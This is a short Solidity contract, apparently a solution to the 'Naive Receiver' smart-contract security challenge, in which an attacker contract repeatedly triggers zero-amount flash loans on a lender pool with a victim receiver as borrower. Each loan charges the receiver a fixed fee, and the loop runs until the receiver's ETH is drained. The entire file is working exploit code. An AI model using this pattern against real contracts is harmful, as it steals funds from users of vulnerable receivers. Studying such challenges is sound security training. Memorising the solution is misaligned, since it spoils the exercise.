// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";

import "./NaiveReceiverLenderPool.sol";

interface INaiveReceiverLenderPool {
    function fixedFee() external pure returns (uint256);

    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract NaiveReceiverAttacker {
    function attack(INaiveReceiverLenderPool pool, address payable receiver)
        public
    {
        uint256 FIXED_FEE = pool.fixedFee();
        while (receiver.balance >= FIXED_FEE) {
            pool.flashLoan(receiver, 0);
        }
    }
}
